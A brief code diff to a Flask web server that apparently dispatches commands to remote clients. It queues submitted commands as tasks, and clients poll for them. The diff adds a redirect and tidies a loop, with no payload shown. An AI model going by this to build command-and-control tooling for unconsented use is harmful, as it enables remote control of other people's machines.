@@ -4,8 +4,10 @@ from flask import (
     Flask,
     request,
     send_file,
+    redirect,
     render_template,
     render_template_string,
+    url_for,
 )
 from datetime import datetime
 from encryption import *
@@ -271,7 +273,7 @@ def provide_command():
     print_debug(client_id)
 
     # If its empty just hold the request until either one dies
-    while(client.current_task is None):
+    while client.current_task is None:
         time.sleep(0.5)
 
     if client.current_task:
@@ -337,6 +339,8 @@ def control_client():
         # create a new task out of a command
         task = Task(command, args=command_args)
         client.current_task = task
+
+        return redirect(f'{url_for("control_client")}?id={client_id}')
 
     database_listing = generate_database_listing(client_id)
 
